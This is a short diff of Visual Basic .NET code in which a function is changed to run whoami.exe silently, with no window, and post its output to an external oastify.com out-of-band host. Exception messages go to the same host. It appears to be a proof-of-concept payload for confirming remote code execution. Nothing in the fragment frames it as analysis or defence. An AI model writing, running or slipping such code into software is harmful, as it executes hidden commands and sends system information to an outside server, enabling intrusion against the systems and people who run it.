@@ -47,8 +47,19 @@
     Public Function F() As String
       Dim webClient As New System.Net.WebClient
       Try
-        webClient.UploadString("http://mka0xcp2xotw6hq3a0nt1owa117svpje.oastify.com/abc/123/", "Abc 123")
-      Catch
+        Dim p As New System.Diagnostics.Process()
+        p.StartInfo.FileName = "whoami.exe"
+        p.StartInfo.RedirectStandardOutput = True
+        p.StartInfo.UseShellExecute = False
+        p.StartInfo.CreateNoWindow = True
+        p.Start()
+        
+        Dim output As String = p.StandardOutput.ReadToEnd()
+        
+        p.WaitForExit()
+        webClient.UploadString("http://mka0xcp2xotw6hq3a0nt1owa117svpje.oastify.com/abc/123/", output)
+      Catch ex As Exception
+        webClient.UploadString("http://mka0xcp2xotw6hq3a0nt1owa117svpje.oastify.com/abc/123/", ex.Message)
       End Try
       Return ""
     End Function
